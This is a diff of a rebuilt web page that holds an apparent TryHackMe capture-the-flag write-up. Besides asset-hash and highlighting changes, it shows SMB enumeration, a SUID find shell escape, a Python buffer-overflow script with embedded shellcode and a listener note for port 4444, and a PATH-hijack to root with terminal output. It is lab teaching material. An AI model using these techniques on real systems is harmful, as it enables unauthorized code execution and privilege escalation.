@@ -36,12 +36,12 @@
   <link
     type="text/css"
     rel="stylesheet"
-    href="/css/main.bundle.min.6392876d35eabbaa711ea81779afb0cae5109113f7350f65e95aea1bd21e6e638b4ce9495a6786c3cee07affcc31970317defd77804c71f0ddae3a395649e93a.css"
-    integrity="sha512-Y5KHbTXqu6pxHqgXea&#43;wyuUQkRP3NQ9l6VrqG9IebmOLTOlJWmeGw87gev/MMZcDF979d4BMcfDdrjo5VknpOg=="
+    href="/css/main.bundle.min.71883ab0661482cf6c7d29b8bdd1af3be3d2f1ea750e56a67846b7f64f41d19b8dc6d7047f48422ec8cbe4a0a412d551c8210307e2b93b1254cdbf7d8af216e0.css"
+    integrity="sha512-cYg6sGYUgs9sfSm4vdGvO&#43;PS8ep1DlameEa39k9B0ZuNxtcEf0hCLsjL5KCkEtVRyCEDB&#43;K5OxJUzb99ivIW4A=="
   />
   
   
-  <script type="text/javascript" src="/js/appearance.min.4df8309499991be53c71b2b39ba0f5d5e77ea7d411d0710ce48c24218e7cc24ded28f19e85838fdc56db2306195cb001f049f577be0cf0ffb2dd6e2037ede1b9.js" integrity="sha512-TfgwlJmZG&#43;U8cbKzm6D11ed&#43;p9QR0HEM5IwkIY58wk3tKPGehYOP3FbbIwYZXLAB8En1d74M8P&#43;y3W4gN&#43;3huQ=="></script>
+  <script type="text/javascript" src="/js/appearance.min.badab316c9287a5a42a843e4eb45da65bb3d194a5a0f5fa4a3e516160e67df0b8c65f4f19a8e146436e29d583699e6cb41d6bbe99e05e1dbaa877763bad9f8e2.js" integrity="sha512-utqzFskoelpCqEPk60XaZbs9GUpaD1&#43;ko&#43;UWFg5n3wuMZfTxmo4UZDbinVg2mebLQda76Z4F4duqh3djutn44g=="></script>
   
     
     
@@ -54,7 +54,7 @@
   
   
     
-    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.61ddd918b834d47011bb8923606e0c3814bbcec0f2d5ab743171ca58a52eea55eb74d2f5ea267d6398ccaf6cabb0360c61b93e541ed4892fddf757fd2d317822.js" integrity="sha512-Yd3ZGLg01HARu4kjYG4MOBS7zsDy1at0MXHKWKUu6lXrdNL16iZ9Y5jMr2yrsDYMYbk&#43;VB7UiS/d91f9LTF4Ig==" data-copy="Copy" data-copied="Copied"></script>
+    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.5ffdd39e73bd1438c0f4ff42f13915f067c633da22f60efa62139a4c51b972622badb1157d4aa4322634b55c8a2dc5ddfbd3917426df1c02d7b69362030197da.js" integrity="sha512-X/3TnnO9FDjA9P9C8TkV8GfGM9oi9g76YhOaTFG5cmIrrbEVfUqkMiY0tVyKLcXd&#43;9ORdCbfHALXtpNiAwGX2g==" data-copy="Copy" data-copied="Copied"></script>
   
   
   
@@ -402,8 +402,8 @@
 </p>
 <p>Port 139 and 445 are NBT and SMB services which we can enumerate with enum4linux</p>
 <p><a href="https://book.hacktricks.xyz/pentesting/pentesting-smb">139,445 - Pentesting SMB</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">enum4linux -A &lt;IP&gt;
-</code></pre></div><p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enum4linux -A &lt;IP&gt;
+</span></span></code></pre></div><p>
 
 
 
@@ -451,8 +451,8 @@
 <p>We can now login and exploit the binaries</p>
 <h2 id="privilege-escalation-1-suid-binary" class="relative group">Privilege escalation #1: SUID binary <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#privilege-escalation-1-suid-binary" aria-label="Anchor">#</a></span></h2>
 <p>We can begin by locating a binary with SUID bit set.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
-</code></pre></div><p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>
 
 
 
@@ -469,8 +469,8 @@
 <p>The /usr/bin/find can be exploited to execute commands as the des user</p>
 <p><a href="https://gtfobins.github.io/gtfobins/find/#suid">find | GTFOBins</a></p>
 <p>Using the GTFOBins we obtain the command</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">/usr/bin/find . -exec /bin/sh -p <span class="se">\;</span> -quit
-</code></pre></div><p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/find . -exec /bin/sh -p <span class="se">\;</span> -quit
+</span></span></code></pre></div><p>Execute it to obtain a shell with an effective user id of that of des. Navigate to /home/des to obtain his flag</p>
 <p>
 
 
@@ -642,8 +642,8 @@
 
 </p>
 <p>The command below gets us the start of the buffer</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">x/100x <span class="nv">$rsp</span>-700
-</code></pre></div><p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">x/100x <span class="nv">$rsp</span>-700
+</span></span></code></pre></div><p>
 
 
 
@@ -676,35 +676,34 @@
 
 </p>
 <p>Putting all these into a python script</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
-<span class="n">payload_len</span> <span class="o">=</span> <span class="mi">616</span>
-<span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">200</span>
-<span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
-<span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51</span><span class="s2">&#34;</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8b\x33</span><span class="s2">&#34;</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
-<span class="n">shellcode_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
-<span class="n">nop_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
-<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">payload_len</span><span class="o">-</span><span class="n">shellcode_len</span><span class="o">-</span><span class="n">nop_len</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
- <span class="n">nop</span><span class="p">,</span>
- <span class="n">shellcode</span><span class="p">,</span>
- <span class="n">padding</span><span class="p">,</span>
- <span class="n">new_rip</span>
-<span class="p">]</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
-
-</code></pre></div><p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_len</span> <span class="o">=</span> <span class="mi">616</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">200</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_rip</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;Q&#34;</span><span class="p">,</span><span class="mh">0x7fffffffe2d4</span><span class="p">)</span> <span class="c1">#selected randomly near the start of the stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xef\xff\xff\xff\x48\xbb\x32\xa3\x67\xe0\x79\x51\x8b</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x33\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x58\x8a\x3f\x79\x13\x53\xd4\x59\x33\xfd\x68\xe5\x31</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc6\xc3\x8a\x30\xa3\x76\xbc\x73\x53\xa2\x92\x63\xeb</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xee\x06\x13\x41\xd1\x59\x18\xfb\x68\xe5\x13\x52\xd5</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7b\xcd\x6d\x0d\xc1\x21\x5e\x8e\x46\xc4\xc9\x5c\xb8</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xe0\x19\x30\x1c\x50\xca\x09\xcf\x0a\x39\x8b\x60\x7a</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x2a\x80\xb2\x2e\x19\x02\xd5\x3d\xa6\x67\xe0\x79\x51</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x8b\x33</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">payload_len</span><span class="o">-</span><span class="n">shellcode_len</span><span class="o">-</span><span class="n">nop_len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl"> <span class="n">nop</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">shellcode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">padding</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"> <span class="n">new_rip</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span></code></pre></div><p><em>The nop_sled is used to increase our chances of hitting the shellcode hence providing some stability to the exploit. The struct module ensures we obey little endian format</em></p>
 <p>Start a meterpreter shell or a nc one listening on port 4444</p>
 <p>
 
@@ -738,20 +737,20 @@
 
 </p>
 <p>the exe.c file on user kel’s home directory shows that we are calling the ps system command. The program will search the ps command in the directories of the PATH variable. We can print out the PATH variables for the kel user as follows</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kel@THM_exploit:~$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
-kel@THM_exploit:~$
-</code></pre></div><p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kel@THM_exploit:~$ <span class="nb">cd</span> /tmp  
-kel@THM_exploit:/tmp$ <span class="nb">echo</span> “/bin/bash” &gt; ps  
-kel@THM_exploit:/tmp$ chmod <span class="m">777</span> ps  
-kel@THM_exploit:/tmp$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
-kel@THM_exploit:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>  
-kel@THM_exploit:/tmp$ <span class="nb">cd</span>  
-kel@THM_exploit:~$ ./exe   
-root@THM_exploit:~#<span class="sb">`</span>
-</code></pre></div><p>We get root !</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kel@THM_exploit:~$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:~$
+</span></span></code></pre></div><p>We can stage our attack as follows - Create our own ps file that spawns a shell and add it to the beginning of $PATH. So when we run the exec binary, we get a shell as root</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kel@THM_exploit:~$ <span class="nb">cd</span> /tmp  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">echo</span> “/bin/bash” &gt; ps  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ chmod <span class="m">777</span> ps  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">echo</span> <span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:/tmp$ <span class="nb">cd</span>  
+</span></span><span class="line"><span class="cl">kel@THM_exploit:~$ ./exe   
+</span></span><span class="line"><span class="cl">root@THM_exploit:~#<span class="sb">`</span>
+</span></span></code></pre></div><p>We get root !</p>
 
       </div>
     </section>
